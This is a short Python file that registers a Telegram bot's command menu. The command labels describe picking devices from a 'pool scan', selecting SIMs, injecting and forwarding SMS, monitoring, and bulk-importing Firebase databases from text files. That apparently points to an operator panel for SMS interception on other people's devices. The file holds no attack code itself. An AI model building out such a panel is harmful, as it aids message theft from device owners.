from telegram import BotCommand

# Single menu for Telegram — must match handlers in telegram_bot.py
BOT_COMMANDS = [
    BotCommand("start", "Welcome & setup guide"),
    BotCommand("key", "License KEY (inject)"),
    BotCommand("setfirebase", "Connect your Firebase DB"),
    BotCommand("setdevice", "Pick device & select SIM"),
    BotCommand("fdy", "Find device (pool scan)"),
    BotCommand("fb", "Find device & select SIM (admin)"),
    BotCommand("fy", "Pick device to monitor"),
    BotCommand("a", "Pick device with KEY (inject)"),
    BotCommand("mynum", "Your forwarding / inject number"),
    BotCommand("addchannel", "Link Telegram channel"),
    BotCommand("startmonitor", "Start monitoring"),
    BotCommand("stopmonitor", "Stop monitoring now"),
    BotCommand("stop", "Pause monitoring"),
    BotCommand("resume", "Resume monitoring"),
    BotCommand("autostop", "Auto-stop timer (minutes)"),
    BotCommand("injecttest", "Test inject SMS"),
    BotCommand("allfirebase", "Bulk Firebase .txt import"),
    BotCommand("status", "Current stats"),
    BotCommand("send", "Manual SMS"),
    BotCommand("ping", "Check latency"),
]


async def register_bot_commands(bot) -> None:
    await bot.set_my_commands(BOT_COMMANDS)
